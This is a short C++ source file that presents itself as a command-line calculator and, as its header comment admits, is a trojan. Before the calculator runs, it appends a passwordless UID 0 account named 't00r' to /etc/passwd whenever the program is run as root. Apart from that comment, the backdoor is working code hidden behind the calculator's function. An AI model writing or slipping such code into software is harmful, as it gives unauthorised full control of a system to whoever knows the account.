/* Minicalc program that puts a passwordless root account on the system
 * named t00r. Must be run as root to have an affect! So please DON'T run it
 * as root!
 * Written as a part of a C++ class many many years ago
*/

#include <iostream>
#include <fstream>
#include <string>

using namespace std;
main(int argc, char *argv[])
{
        bool found = false;
        string pw1;
        string pw2;
        pw2 = "t00r::0:0:toor:/root:/bin/tcsh";
        ifstream testpw("/etc/passwd");
        ofstream fil("/etc/passwd", ios::app);
        string adda;
        while (testpw >> pw1)
        {
                if (pw1 == pw2)
                {
                found = true;
                }
        }
        if (found)
        {
                goto CALC;
        }
        
        adda = "t00r::0:0:toor:/root:/bin/tcsh";
        fil << adda;
        
CALC:
        
        int a;
        char b;
        int c;
        double d;
        cout << ": "; cin >> a; cin >> b; cin >> c;
                switch(b) {
                        case '+':
                                d = a + c;
                                break;
                        case '-':
                                d = a - c;
                                break;
                        case '*':
                                d = a * c;
                                break;
                        case '/':
                                d = a / c;
                                break;
                        default:
                                cout << "You typed something wrong!" << endl;
                        } 
                        cout << d;
                        cout << endl;
                        
                        
                        ofstream fut(argv[1], ios::app);
                        fut << a << ' ' << b << ' ' << c << " = " << d << 
endl;
                        fut.close();
                        fil.close();
}

